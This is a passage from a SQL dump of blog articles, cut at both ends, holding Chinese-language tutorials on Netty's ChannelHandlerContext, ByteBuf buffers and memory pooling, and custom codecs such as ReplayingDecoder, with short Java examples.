您可以通过调用ChannelHandlerContext其中一种方法通知同一ChannelPipeline中另一个最近的ChannelHander\n(4) 您可以通过调用ChannelHandler中pipeline的方法去获取ChannelHandler所属的ChannelPipeline对象,应用可以在运行期间动态插入,删除或者替换ChannelPipeline当中的ChannleHandle\n(5) 你可以去获取到一个ChannelHandlerContext作为成员变量供后续去使用,比如在ChannelHandler方法之外去触发一个事件,甚至说在不同线程当中去触发\n\n// AttributeKey\n// attr方法\nAttributeKey<String> niubi = AttributeKey.valueOf(\"Hello\");\nctx.channel().attr(niubi).set(\"World\");\nctx.attr(niubi).set(\"Hello\"); // 4.1后被废弃\n\n(1) attr方法可以让你存储并且访问有状态的一些业务自定义信息,这些信息可能和ChannelHandler或者ChannelHandlerContext有关联的.请参考ChannelHandle来去了解各种推荐的方式来去管理有状态的一些信息\n(2) 4.1前,只要有一个ChannelHandler,那么这个ChannelHandler就有一个与之对应的ChannelContext,如果有十个ChannelHandler,就会有十个ChannelContext,就会有十个不同的Map,用于分别存放这个ChannelHandler自己作用域里的KeyValue值,而Channel本身又有一个独立Map,这会导致作用域不同无法取值且容易被困扰\n(3) 4.1后,只会有一个Map,这个Map会被Channel以及同Channel上面所有的ChannelHandler所共享,netty确保了键是不会重复\n\n```\n#### 初始化ChannelHandlerContext\n![newChannelHandlerContext1.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1568470093_newChannleHandlerContext1.png)\n![newChannelHandlerContext2.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1568470276_newChannelHandlerContext2.png)\n```java\n(1) ChanneHandlerContext是每次向ChannelPipeline添加ChannelHandler时创建的\n(2) 是在DefaultChannelPipeline的add..等方法中创建的\n(3) ChanneHandlerContext内部封装了一个ChannelHandler对象,ChanneHandlerContext是可以访问到ChannelHandler的,而ChannelHandler也可以使用handlerAdded添加ChanndlerHanderContext\n\n```\n#### FastThreadLocal的使用\n![fasthreadlocal1.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1568470276_fasthreadlocal1.png)\n![fastthreadlocal2.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1568470276_fastthreadlocal2.png)\n![fastthreadlocal3.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1568470276_fastthreadlocal3.png)\n```java\n// FastThreadLocal\n(1) 它是ThreadLocal的一种变种,它会产生更高的访问性能\n(2) 在内部,FastThreadLocal会使用常量的索引,而不会使用散列.来去寻找变量,看上去性能变化很微小,但是它会稍微对性能有所改进相比与使用hashTable来说,而且在频繁访问的情况下是更加有用的\n(3) 因为这个原因,要想充分利用线程本地变量这种优势的话,你的线程必须是一个FastThreadLocalThread或者是它的子类型,默认情况下.DefaultThreadFactory创建的所有线程都是FastThreadLocalThread\n(4) 只能通过一个FastThreadLocalThread或子类进行,因为它需要一个特殊的字段来去存储一些必要的状态,通过其他的方式进行的访问都会退回到ThreadLocal\n```\n#### 一个ChannelHandler可以有多个ChannelHandlerContext\n```java\n(1) 一个ChannelHandler可以拥有多于一个的ChannelHandlerContext,通常情况下,一个ChannelHandler就对应一个ChannelHandlerContext,但有些情况下一个ChannelHandler是可以拥有多个ChannelHandlerContext对象\n(2) 请注意,一个ChannelHandler实例可以被添加多次到ChannelPipeline当中,这意味着一个单个ChannelHandler实例可以拥有超过一个ChannelContext\n(3) 因此这个单个的实例可以在不同的ChannelContext被调用,如果它被添加到ChannelPipeline当中超过一次,那么它就有了多个ChannelHandlerContext\n\n 	FactorialHandler fh = new FactorialHandler();\n        \n        ChannelPipeline p1 = ch.pipeline();\n        p1.addLast(\"f1\", fh);\n        p1.addLast(\"f2\", fh);\n\n        ChannelPipeline p2 = ch.pipeline();\n        p2.addLast(\"f3\", fh);\n        p2.addLast(\"f4\", fh); \n\n不同的ChannelHandlerContext被赋予\"f1\", \"f2\", \"f3\"和 \"f4\",*即使它们引用的是相同的ChannelHandler实例*\n```', 0, 0, 126, 0, 0, '2020-02-14 18:36:18', '2020-02-14 18:36:18', 0, 0);
INSERT INTO `article` VALUES (71, 1, 'Netty的ByteBuf', '2019/9/1568516584_mmexport1568440752529.jpg', '### ByteBuf结构\n![NettyByteBuf结构.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1626793570_Netty-ByteBuf结构.png)\n```java\n       +-------------------+------------------+------------------+\n       | discardable bytes |  readable bytes  |  writable bytes  |\n       |                   |     (CONTENT)    |                  |\n       +-------------------+------------------+------------------+\n       |                   |                  |                  |\n       0      <=      readerIndex   <=   writerIndex    <=    capacity\n```\n```java\n// JDK的ByteBuffer的缺点\n(1) final byte[] hb; 这是JDK的ByteBuffer对象用于存储数据的对象声明。\n(2) 可以看到,其字节数组是被声明final的,也就是长度固定不变的,一旦分配好后不能动态扩容与收缩\n(3) 当待存储的数据字节很大时就很有可能出现IndexOutOfBoundException.如果要预防这个异常,那就需要在存储之前完全确定好待存储的字节大小。\n(4) 如果ByteBuffer的空间不足,我们只有一种解决方案,创建一个全新的ByteBuffer对象,然后再将之前的ByteBuffer中的数据复制过去,这一切操作都需要由开发者自己来手动完成。\n(5) ByteBuffer只使用一个position指针来标识位置信息,在进行读写切换时就需要调用flip方法或是rewind方法,使用起来不方便\n\n// Netty的ByteBuf的优点\n(1) 存储字节的数组是动态的,其最大值默认是Integer.MAX_VALUE,这里的动态性是体现在write方法中的\n(2) write方法在执行时会判断buffer容器大小,如果不足则自动扩容\n(3) Netty的ByteBuf采用了读写索引分离的策略(readerIndex与writerIndex)\n(4) 一个初始化(里面尚未有任何数据)的ByteBuf的readerIndex与writerIndex值都为0\n\n// ByteBuf结构\n(1) 从结构上来说，ByteBuf 由一串字节数组构成。数组中每个字节用来存放信息\n(2) ByteBuf 提供了两个索引，一个用于读取数据，一个用于写入数据。这两个索引通过在字节数组中移动，来定位需要读或者写信息的位置。\n(3) 当从 ByteBuf 读取时，它的 readerIndex（读索引）将会根据读取的字节数递增。\n(4) 当写 ByteBuf 时，它的 writerIndex 也会根据写入的字节数进行递增。\n(5) 如果 readerIndex 超过了 writerIndex 的时候，Netty 会抛出 IndexOutOf-BoundsException 异常。\n\n如图展示一个Buff是如何被这两个指针分成三个区域\n// discardable bytes(可丢弃字节区域)\n(1) 该段包含读操作已读取的字节\n(2) 可丢弃字节区域是指:[0，readerIndex)之间的区域。可调用discardReadBytes()方法丢弃已经读过的字节\n(3) 一开始长度是0,它的值会随着读操作不断执行而一直增加,最多增加到writeIndex位置,它不能超过writeIndex\n(4) 被读取过字节是可以通过discardReadBytes方法被丢弃掉,然后去回收一个未使用的空间,这样可写入的字节就更多了\n\n// readable bytes(可读字节区域)\n(1) 此段是存储实际数据的位置\n(2) 可读字节区域是指:[readerIndex, writerIndex)之间的区域。\n(3) 任何名称以read和skip开头的操作方法，都会改变readerIndex索引。\n(4) 如果read操作的参数是一个ByteBuf的话,并且没有指定目标指针索引\n那么被指定的ByteBuf的readIndex也会相应的改变,也就是把当前ByteBuf读取到参数ByteBuf中\n实际上是在参数的ByteBuf上去写,写的同时就会让参数ByteBuf的writeIndex进行改变\n(5) 如果没有足够的内容存在,再去读的话就会出现IndexOutOfBoundsException\n对于新分配的或包装或拷贝的ByteBuf的readIndex默认值是0\n\n// writable bytes(可写字节区域)\n(1) 此段是未定义的空间,需要填写\n(2) 可写字节区域是指:[writerIndex, capacity)之间的区域。\n(3) 任何名称以write开头的操作方法都将改变writerIndex的值。\n(4) 如果write操作参数是一个ByteBuf的话,并且没有指定目标指针索引\n那么被指定的ByteBuf的writeIndex也会相应的改变\n(5) 如果没有足够的字节可以写入的话,就会出现IndexOutOfBoundsException,对于新分配的ByteBuf的writeIndex默认值是0\n而对于包装或者拷贝的ByteBuf的writeIndex值则是ByteBuf的capacity\n\n// 绝对操作与相对操作\n(1) get()和set()开头的绝对操作: 从给定的索引开始，并且保持索引不变\n(2) read()和write()开头的相对操作: 从给定的索引开始，并且根据已经访问过的字节数对索引进行访问\n\n// 动态分配ByteBuf大小\n(1) Netty默认在读取收到的数据时，使用了具有自适应的AdaptiveRecvByteBufAllocator 决定每次分配的ByteBuf的大小\n(1) RecvByteBufAllocator接口会根据反馈,它会自动增加以及减少的buffer大小\n(2) 上一次读取的字节数已经完全填满了字节数组的话,那么它会优雅地自动增加期望可读的字节量,相当于自动增加缓冲区的大小\n(3) 如果读操作连续两次并没有填充满字节数组,它也会优雅地减少可期望可读的字节数.否则它会保持相同的预测\n(4) 它本身会基于前一次读的字节数量以及之前所分配的字节缓冲区大小,两者之间进行比对,根据前一次比对的结果,自动调节分配的大小\n(5) AdaptiveRecvByteBufAllocator(): 创建一个预测器,期望缓冲区大小是从1024开始的,但是不会低于64也不会高于65536\n(6) sizeTable-静态代码块中进行了初始化,目标是设定好可分配的缓冲区大小,决定下一次分配缓冲区的多少,取决sizeTable中每一个元素值是什么申请buffer直接内存,如果是系统允许的话\n```\n### ByteBuf的函数方法\n#### discardReadBytes方法\n![NettyByteBuf结构discardReadBytes.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1626793570_Netty-ByteBuf结构-discardReadBytes.png)\n```java\n   BEFORE discardReadBytes()\n \n       +-------------------+------------------+------------------+\n       | discardable bytes |  readable bytes  |  writable bytes  |\n       +-------------------+------------------+------------------+\n       |                   |                  |                  |\n       0      <=      readerIndex   <=   writerIndex    <=    capacity\n \n \n   AFTER discardReadBytes()\n \n       +------------------+--------------------------------------+\n       |  readable bytes  |    writable bytes (got more space)   |\n       +------------------+--------------------------------------+\n       |                  |                                      |\n  readerIndex (0) <= writerIndex (decreased)        <=        capacity\n```\n```java\n// discardReadBytes方法\n目的是为了回收以读取使用的空间,这样可写入的字节就更多了\n(1) discardReadBytes(): 将可读字节区域(CONTENT)[readerIndex, writerIndex)往前移动readerIndex位，\n同时修改readerIndex和writerIndex 。\n(2) discardReadBytes()方法会移动可读字节区域内容(CONTENT)。\n如果频繁调用，会有多次数据复制开销，对性能有一定的影响\n(3) 当调用discardableByte()后,中间readable bytes内容实际上会发生一次数据的复制过程,会把数据复制到最开头的位置上\n复制后,之前readable bytes内容实际上就变成了可写入的内容区域\n\n```\n#### clear方法\n![NettyByteBuf结构clear.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1626793570_Netty-ByteBuf结构-clear.png)\n```java\n   BEFORE clear()\n \n       +-------------------+------------------+------------------+\n       | discardable bytes |  readable bytes  |  writable bytes  |\n       +-------------------+------------------+------------------+\n       |                   |                  |                  |\n       0      <=      readerIndex   <=   writerIndex    <=    capacity\n \n \n   AFTER clear()\n \n       +---------------------------------------------------------+\n       |             writable bytes (got more space)             |\n       +---------------------------------------------------------+\n       |                                                         |\n       0 = readerIndex = writerIndex            <=            capacity\n```\n```java\n// clear方法\n(1) 你可以通过调用clear将readerIndex与writerIndex置为0\n(2) 它只会将两个指针置为0,并不会将缓冲区内容清除\n(3) 注意这个语义和Java Nio中ByteBuffer的clear()语义是不一样的\n\n```\n#### 缓冲区视图拷贝\n```java\nduplicate()\nslice()\nslice(int, int)\nreadSlice(int)\nretainedDuplicate()\nretainedSlice()\nretainedSlice(int, int)\nreadRetainedSlice(int)\nreadRetainedSlice(int)\n\n(1) 派生缓冲区为ByteBuf提供了一个访问的视图。视图仅仅提供一种访问操作，不做任何拷贝操作。下列方法，都会呈现给使用者一个视图，以供访问\n(2) 上面的6种方法都会返回一个新的ByteBuf实例，具有自己的读索引和写索引。但是，其内部存储是与原对象是共享的。这就是视图的概念,这是一种浅拷贝\n(3) 请注意：如果你修改了这个新的ByteBuf实例的具体内容，那么对应的源实例也会被修改，因为其内部存储是共享的\n(4) 如果需要拷贝现有缓冲区的真实副本，请使用copy()或copy(int, int)方法来完成深拷贝。\n(5) 使用派生缓冲区视图，避免了复制内存的开销，有效提高程序的性能\n```\n### ByteBuf使用模式\n#### Netty的ByteBuf三种模式与JDK的ByteBuffer转换\n```java \n// HeapBuffer 堆缓冲区\n(1) 这是最常用的模式,ByteBuf将数据存储到JVM的堆空间中,并且将实际的数据存放到byte array中来实现\n(2) 优点: 由于数据是存储在JVM的堆中,因此可以快速的创建与快速的释放,并且它提供了直接访问内部字节数组的方法\n(3) 缺点: 每次读写数据时,都需要将数据复制到直接缓冲区中,再进行网络传输.\n(4) 对于后端的业务消息的编解码来说,推荐使用HeapByteBuf\n\n// DirectBuffer 直接缓冲区\n(1) 在堆之外直接分配内存空间,直接缓冲区并不会占用堆的容量空间,因为它是由操作系统在本地内存进行的数据分配\n(2) 优点: 在使用Socket进行数据传递时,性能非常好,因为数据直接位于操作系统的本地内存中,所以不需要从JVM将数据复制到直接缓冲区中\n(3) 缺点: 因为DirectBuffer是直接在操作系统内存中,所以内存空间的分配与释放要比堆空间更加复杂,而且速度要慢一些,Netty通过提供内存池来解决这个问题\n直接缓冲区并不支持通过字节数组的方式来访问数据\n(4) 对于I/O通信线程在读写缓冲区时,推荐使用DirectByteBuf\n\npublic static void main(String[] args) {\n        CompositeByteBuf compositeByteBuf = Unpooled.compositeBuffer();\n        ByteBuf heapBuf = Unpooled.buffer(10);\n        ByteBuf directBuf = Unpooled.directBuffer(10);\n\n        compositeByteBuf.addComponents(heapBuf, directBuf);\n        // compositeByteBuf.removeComponent(0);\n        Iterator<ByteBuf> iter = compositeByteBuf.iterator();\n        while (iter.hasNext()) {\n            System.out.println(iter.next());\n        }\n        compositeByteBuf.forEach(System.out::println);\n} \n\n// CompositeBuffer(复合缓冲区)\n(1) 一个虚拟缓冲区，它将多个缓冲区显示为单个合并缓冲区。\n(2) 它是一种容器,这个容器里面可以存放其他缓冲区\n(3) 在一些需要拆分合并缓冲区场景会起到作用,作用场景类似于JavaNIO中的Scattering与Gathering\n\n```\n#### 与JDK的ByteBuffer转换\n```java\n// 字节数组\n如果一个ByteBuf是由一个字节数组来维护的话,你就可以直接通过array()方法来去访问它的数组\n要想确定ByteBuf是否由一个字节数组维护的话通过hasArray()方法就可以知道\n\n// ByteBuf转换\n如果一个ByteBuf是可以转换成NIO的ByteBuffer的话,那么你可以调用nioBuffer()来实现\nByteBuf提供了toString(Charset)方法,来将ByteBuf转换成字符串,toString方法会接收一个Charset字符集\n注意不带参数的toString()方法并不是一个转换方法\n\npublic static void main(String[] args) throws Exception {\n        byte[] content = \"Hello world 你好\".getBytes(\"utf-8\");\n\n        ByteBuf byteBuf1 = Unpooled.buffer(512);\n        byteBuf1.writeBytes(content);\n        System.out.println(byteBuf1.hasArray()); // true\n        System.out.println(byteBuf1.isDirect()); // false\n        System.out.println(byteBuf1.array()); // 不会报错\n        System.out.println(byteBuf1.nioBuffer()); // java.nio.HeapByteBuffer[pos=0 lim=18 cap=18]\n        System.out.println(byteBuf1.toString(Charset.forName(\"utf-8\")));// Hello world 你好\n\n        ByteBuf byteBuf2 = Unpooled.directBuffer(512);\n        byteBuf2.writeBytes(content);\n        System.out.println(byteBuf2.hasArray()); // false\n        System.out.println(byteBuf2.isDirect()); // true\n        // System.out.println(byteBuf2.array()); // 将会报错,抛出java.lang.UnsupportedOperationException\n        System.out.println(byteBuf2.nioBuffer()); // java.nio.DirectByteBuffer[pos=0 lim=18 cap=18]\n        System.out.println(byteBuf2.toString(Charset.forName(\"utf-8\")));// Hello world 你好\n\n        CompositeByteBuf compositeByteBuf = Unpooled.compositeBuffer();\n        compositeByteBuf.addComponents(byteBuf1, byteBuf2);\n        System.out.println(compositeByteBuf.hasArray()); // false\n        System.out.println(compositeByteBuf.isDirect()); // false\n        // System.out.println(compositeByteBuf.array()); // 将会报错,抛出java.lang.UnsupportedOperationException\n        System.out.println(compositeByteBuf.nioBuffer()); // java.nio.HeapByteBuffer[pos=0 lim=18 cap=18]\n        System.out.println(compositeByteBuf.toString(Charset.forName(\"utf-8\")));// 没有内容\n        Iterator<ByteBuf> iter = compositeByteBuf.iterator();\n        while (iter.hasNext()) {\n            // UnpooledByteBufAllocator$InstrumentedUnpooledUnsafeHeapByteBuf(ridx: 0, widx: 18, cap: 512))\n            // UnpooledByteBufAllocator$InstrumentedUnpooledUnsafeNoCleanerDirectByteBuf(ridx: 0, widx: 18, cap: 512))\n            System.out.println(iter.next());\n        }\n        compositeByteBuf.forEach(byteBuf -> {\n            System.out.println(byteBuf.toString(Charset.forName(\"utf-8\")));// Hello world 你好\n        });\n    }\n```\n### ByteBuf的分配\n```java\nNetty 提供了两种 ByteBufAllocator 的实现，分别是：\n(1) PooledByteBufAllocator，实现了 ByteBuf 的对象的池化，提高性能减少内存碎片。\n(2) Unpooled-ByteBufAllocator，没有实现对象的池化，每次会生成新的对象实例。\n\n// 对象池化\n对象池化的技术和线程池比较相似,主要目的是提高内存的使用率。\n池化的简单实现思路:\n(1) 在 JVM 堆内存上构建一层内存池，通过 allocate 方法获取内存池中的空间，通过 release 方法将空间归还给内存池。\n(2) 对象的生成和销毁，会大量地调用 allocate 和 release 方法。\n(3) 因此内存池面临碎片空间回收的问题，在频繁申请和释放空间后，内存池需要保证连续的内存空间，用于对象的分配。\n(4) 基于这个需求，有两种算法用于优化这一块的内存分配：伙伴系统和 slab 系统。\n\n伙伴系统:\n(1) 用完全二叉树管理内存区域，左右节点互为伙伴，每个节点代表一个内存块。\n(2) 内存分配将大块内存不断二分，直到找到满足所需的最小内存分片。\n(3) 内存释放会判断释放内存分片的伙伴（左右节点）是否空闲，如果空闲则将左右节点合成更大块内存。\n\nslab 系统:\n(1) 主要解决内存碎片问题，将大块内存按照一定内存大小进行等分，形成相等大小的内存片构成的内存集。\n(2) 按照内存申请空间的大小，申请尽量小块内存或者其整数倍的内存，释放内存时，也是将内存分片归还给内存集。\n(3) Netty 内存池管理以 Allocate 对象的形式出现。\n(4) 一个 Allocate 对象由多个 Arena 组成，每个 Arena 能执行内存块的分配和回收。\n\nArena 内有三类内存块管理单元：\n(1) TinySubPage\n(2) SmallSubPage\n(3) ChunkList\nTiny 和 Small 符合 Slab 系统的管理策略，ChunkList 符合伙伴系统的管理策略。\n当用户申请内存的大小:\n(1) 介于 tinySize 和 smallSize 之间时，从 tinySubPage 中获取内存块。\n(2) 介于 smallSize 和 pageSize 之间时，从 smallSubPage 中获取内存块。\n(3) 介于 pageSize 和 chunkSize 之间时，从 ChunkList 中获取内存。\n(4) 大于 ChunkSize（不知道分配内存的大小）的内存块不通过池化分配。\n```', 0, 0, 96, 0, 0, '2020-02-15 11:03:21', '2020-02-15 11:03:21', 0, 0);
INSERT INTO `article` VALUES (72, 1, 'Netty的自定义编解码器与解决粘包拆包', '2019/9/1568608331_mmexport1568527413195.jpg', '### 编解码器\n#### 基本概念\n```java\n// Netty的ChannelHandler\n(1) Netty的处理器可以分为两类: 入栈处理器与出栈处理器\n(2) 入栈处理器的顶层接口是ChannelInboundHandler,出栈处理器的顶层接口是ChannelOutboundHandler\n(3) 数据处理器常用的各种编解码器本质上都是处理器\n(4) 编解码器: 无论我们向网络中写入的数据是什么类型(int,char,String,二进制等等)。\n数据在网络中传递时,其都是以字节流的形式呈现的:\n将数据由原本的形式转换为字节流的操作称为编码(encode)\n将数据由字节转换为它原本的格式或是其他格式的操作称为解码(decode)\n编解码统一称为codec\n(5) 编码: 本质上是一种出栈处理器;因此,编码一定是一种ChannelOutboundHandler\n(6) 解码: 本质上是一种入栈处理器;因此,解码一定是一种ChannelInboundHandler\n(7) 在Netty中,编码器通过以XXXEncoder命名,解码器通常以XXXDecoder命名\n\n```\n#### 编码器MessageToByteEncoder\n```java\n// MessageToByteEncoder\npublic class IntegerEncoder extends MessageToByteEncoder<Integer> {\n    @Override\n    protected void encode(ChannelHandlerContext ctx, Long msg, ByteBuf out) throws Exception {\n	// 把Integer写到了ByteBuf当中\n        out.writeInt(msg)\n    }\n}\n\n(1) MessageToByteEncoder是netty提供的最基础的消息到字节的编码器,它本身是一个ChannelOutboundHandlerAdapter\n(2) 它会已类似流的方式将消息转换成ByteBuf,比如将Integer转换为ByteBuf\n(3) 泛型I表示我们要将什么类型的数据给转换成ByteBuf,换句话说就是原类型,这里的原类型就是Integer\n(4) 该类为我们做了大量工作,我们只需实现一个抽象方法encode(..)\n(5) encode(ChannelHandlerContext, Long, ByteBuf): 当消息是这个编码器可以处理的消息时,这个方法会被调用.\n(6) encode(ChannelHandlerContext, Long, ByteBuf)的调用前提是通过TypeParameterMatcher的校验匹配\n(7) 比如需要编码的是Integer,而传进来的是String.那么就不会进行调用,因为类型不匹配\n\n// 自定义编码器\npublic class MyLongToByteEncoder extends MessageToByteEncoder<Long> {\n    @Override\n    protected void encode(ChannelHandlerContext ctx, Long msg, ByteBuf out) throws Exception {\n        out.writeLong(msg);\n    }\n}\n```\n#### 解码器ByteToMessageDecoder\n```java\n// ByteToMessageDecoder\npublic class MyByteToLongDecoder extends ByteToMessageDecoder {\n	// ctx: 编解码器本质上是ChannelHandler,这是该解码器所对应的ChannelHandlerContext\n	// in: 从其中开始读取数据的ByteBuf,需要解码的数据来自于ByteBuf\n	// out: 从in中读取数据开始解析,然后把解析的结果放到out当中\n    @Override\n    protected void decode(ChannelHandlerContext ctx, ByteBuf in, List<Object> out) throws Exception {\n    \n	}\n}\n\n(1) ByteToMessageDecoder是netty提供的最基础的字节到消息的解码器,它本身是一个ChannelInboundHandlerAdapter\n(2) 它会已类似流的方式将ByteBuf解码成另外一种消息类型(AbstractNioByteChannel会将从客户端接收过来的Byte转换成ByteBuf对象,在read()方法,往ChannelPipeline后面不断传递)\n(3) 该类为我们做了大量工作,我们只需实现一个抽象方法decode(..)\n(4) decode(ChannelHandlerContext, ByteBuf, List): 对其进行解码,将一个ByteBuf解码成另外一种类型。\n(5) decode()这个方法会被持续的调用,直到返回的时候输入的ByteBuf无法读取,或者从输入的ByteBuf中什么也读不到。\n\n// 注意问题\n(1) 如果你要自定义解码器,你就需要非常小心地去实现ByteToMessageDecoder\n(2) 请确保在ByteBuf当中有足够的字节作为一个完整的帧(比如int占4个字节,如果直接readInt()的话,可能Buffer里只有3个字节,这样就不构成4个字节,因此这就是不完整的帧)\n(3) 你可以用ByteBuf.readableBytes()来检查判断字节数量。\n(4) 如果不构成一个完整的帧,就直接返回,且不要去修改readIndex,从而让更多的字节到达。\n(5) 要想检查一个完整的帧且不修改readIndex,请使用根据索引的绝对操作方法ByteBuf.getInt(int);绝对方法指的是不会改变索引值的方法\n(6) 当使用诸如ByteBuf.getInt(int)这样的方法时候,你必须使用读索引的方式去处理,比如调用in.getInt(0)这个方法就假设这个帧是从Buffer的起始位置开始的\n(7) 但实际情况往往不是这个样子的,因此应该使用in.getInt(in.readerIndex()),因为在过程中起始位置未必就是0这个位置\n(8) 请注意,ByteToMessageDecoder的子类不可以被标记为Sharable注解;Sharable注解标识ChannelHandler相同的实例可以多次添加到一个或多个ChannelPipeline,如果未指定此注解,每次将它添加到管道实例时,你必须创建新的ChannelHandler实例\n(9) 一些方法,比如说ByteBuf.readBytes(int)如果返回的Buffer没有被释放或者被添加到out list当中会导致内存泄漏;这种情况下,应该使用衍生Buffer,比如ByteBuf.readSlice(int)这样的方法来避免内存泄漏\n\n// decodeLast\n(1) 当ChannelHandlerContext处于活跃状态时最后一次调用。这意味着触发了ChannelInactive,随后进入不活跃状态\n(2) 默认情况下，这只会调用decode(),但在特殊情况(http情况)下子类可能会覆盖decodeLast()进行某些特殊的清理操作\n(3) https://github.com/netty/netty/issues/4386\n\n// 自定义解码器\npublic class MyByteToLongDecoder extends ByteToMessageDecoder {\n    @Override\n    protected void decode(ChannelHandlerContext ctx, ByteBuf in, List<Object> out) throws Exception {\n        if (in.readableBytes() >= 8) {\n            // 可以读取一个long,long是8字节\n            // 判断必须要有,可以构造一个完整的帧\n            out.add(in.readLong());\n        }\n    }\n}\n```\n#### 解码器MessageToMessageDecoder\n```java\npublic class StringToIntegerDecoder extends MessageToMessageDecoder<String> {\n    @Override\n    protected void decode(ChannelHandlerContext ctx, String message, List<Object> out) throws Exception {\n        out.add(message.length());\n    }\n}\n\n// MessageToMessageDecoder\n(1) 它是本身继承ChannelInboundHandlerAdapter,它会将消息从一种类型解码成另外一种类型(可能是数据类型转换,可能是直接转换成Java对象)\n(2) 数据从网络接收进人到程序当中,已入栈形式呈现.\n(3) 处理器可能会对接收到的消息再一次进行转换,又转换成另外一种消息类型,这种情况下就需要使用到MessageToMessageDecoder\n(4) 举个例子,它会把String解码成Integer,这个Integer代表字符串的长度\n(5) 同样与之对应的出栈编码器有MessageToMessageEncoder\n\n// 注意事项\n(1) 无论是编码器或是解码器,其所接收的消息类型必须要与待处理的参数类型一致,否则该编码器或解码器并不会执行\n(2) 在解码器进行数据解码时,一定要判断缓冲(ByteBuf)中的数据是否足够,否则将会产生一些问题\n```\n#### 解码器ReplayingDecoder\n```java\n// 内容分为两个部分,前部分为head,后部分为body\n// head: 为一个int,内容是body的长度\n// body: 真正的内容\n// 先获取head得到内容长度,再获取内容\n\n// 使用ByteToMessageDecoder实现,那么将会较为复杂\npublic class IntegerHeaderFrameDecoder extends ByteToMessageDecoder {\n    @Override\n    protected void decode(ChannelHandlerContext ctx, ByteBuf buf, List<Object> out) throws Exception {\n        if (buf.readableBytes() < 4) {\n            return;\n        }\n        buf.markReaderIndex();\n        int length = buf.readInt();\n\n        if (buf.readableBytes() < length) {\n            buf.resetReaderIndex();\n            return;\n        }\n        out.add(buf.readBytes(length));\n    }\n}\n\n// 使用ReplayingDecode进行简化\npublic class IntegerHeaderFrameDecoder extends ReplayingDecoder<Void> {\n    @Override\n    protected void decode(ChannelHandlerContext ctx, ByteBuf buf, List<Object> out) throws Exception {\n        out.add(buf.readBytes(buf.readInt()));\n    }\n}\n\n// ReplayingDecoder\n(1) 它继承了ByteToMessageDecoder\n(2) 它是ByteToMessageDecoder特殊的变种,它可以实现在阻塞IO模式中实现非阻塞的解码器\n(3) ReplayingDecode与ByteToMessageDecoder最大区别是 在实现ReplayingDecode的decode与decodeLast这些方法时,就像所有需要的字节都已经被接收到了一样,而不必检查所需字节是不是可用或者是不是存在\n\n// 使用ReplayingDecoder,不需要检查消息类型字节完整\npublic class MyByteToLongDecoder extends ReplayingDecoder<Void> {\n    @Override\n    protected void decode(ChannelHandlerContext ctx, ByteBuf in, List<Object> out) throws Exception {\n        out.add(in.readLong());\n    }\n}\n// ReplayingDecoder\n(1) 它本身继承了ByteToMessageDecoder,相比ByteToMessageDecoder更加易用\n(2) 泛型S通过表示Enum或Void,如果不需要状态管理的话使用Void\n\n// ReplayingDecoder如何实现的\n(1) ReplayingDecoder传递了一个特殊的ByteBuf实现,叫做ReplayingDecoderByteBuf;它会当Buffer中没有足够的数据就会抛出某种类型的Error,Netty自定义了一个错误对象叫做Signal\n(2) 在上面的例子(IntegerHeaderFrameDecoder)中,当你去调用buf.readInt()的时候你只是假设Buffer当中有4个或4个以上的可用字节,如果Buffer当中真的有4个字节的话那么它就会返回Integer header,如你所期望的那样;否则没有4个字节的话,这种情况下就会抛出一个Error\n(3) 当抛出Error时,控制会返回给ReplayingDecoder,如果ReplayingDecoder捕获到了这个Error的话,它就会Buffer的readIndex重新置成初始的位置(比如Bufffer的起始位置),并且当有更多数据进入Buffer当中的时候再一次调用decode(..)\n(4) 如果数据足够它就会正常的读取,如果数据不够它就会抛出错误,ReplayingDecoder会捕获这个错误,同时把这个流程继续处理,同时会把之前已经部分读取的readIndex重置回初始的位置,如果Buffer当中有更多的数据进来的话,它还会继续调用decode(..)方法进行处理,直到能够处理或者数据足够为止\n(5) ReplayingDecoder总是抛出相同的被缓冲的Error实例,从而避免每次创建新的Error时候的负担和每次抛出时添加的堆栈信息\n\n// ReplayingDecoder的限制\n(1) 以简单为代价,ReplayingDecoder对你施加了一些限制\n(2) 某些Buffer操作是禁止的,因为这是ReplayingDecoder它自己实现的ByteBuf\n(3) 如果网络很慢而且消息格式并不像刚才例子那么简单的话,性能可能会很差;在这种情况下,你的解码器可能不得不周而复始每次都解码相同的部分;因为某一时刻调用decode方法发现数据不够,数据不够就会把数据回到初始状态,然后流程又返回到了decode方法当中,这时又有字节过来了,尝试再次进行解码,发现数据还不够,又会去周而复始重复这个过程\n(4) 你必须记住为了解码一个单个的消息,decode方法可能会被调用很多次\n```\n#### ReplayingDecoder性能改进\n```java\nenum MyDecoderState {\n    READ_LENGTH,\n    READ_CONTENT;\n}\n\npublic class IntegerHeaderFrameDecoder extends ReplayingDecoder<MyDecoderState> {\n    private int length;\n    public IntegerHeaderFrameDecoder() {\n        // Set the initial state.\n        super(MyDecoderState.READ_LENGTH);\n    }\n    @Override\n    protected void decode(ChannelHandlerContext ctx, ByteBuf buf, List<Object> out) throws Exception {\n	// 先读取长度再读取内容\n        switch (state()) {\n            case READ_LENGTH:\n                length = buf.readInt();\n                checkpoint(MyDecoderState.READ_CONTENT);\n            case READ_CONTENT:\n                ByteBuf frame = buf.readBytes(length);\n                checkpoint(MyDecoderState.READ_LENGTH);\n                out.add(frame);\n                break;\n            default:\n                throw new Error(\"Shouldn\'t reach here.\");\n        }\n    }\n}\n\n(1) 一个复杂的解码器性能可以借助于checkPoint()方法获得极大的改进\n(2) checkPoint()这个方法会更新Buffer的初始化位置,这样ReplayingDecoder就可以重新的定位它的readerIndex到上一次checkPoint()方法的位置\n(3) 你可以使用checkPoint()方法同时自己去管理decoder的状态,最简单管理decoder的方式就是创建一个Enum类型,这个Enum代表了decoder的当前的状态,并且还可以在状态改变的时候去调用checkPoint(T)方法更新这个状态,你可以根据自己的需要设定任意多的状态,这取决于你想去解码的消息的复杂性是什么样子的\n(4) checkPoint()加Enum的方式就可以很好的解决在使用ReplayingDecoder的时候对同一个部分消息内容进行重复解码的问题.通过这种方式就可以让我们不会在对同一个消息进行再次的解码\n\n// 另外一种去管理解码器状态方式是你自己去管理\npublic class IntegerHeaderFrameDecoder2 extends ReplayingDecoder<Void> {\n    private boolean readLength;\n    private int length;\n    @Override\n    protected void 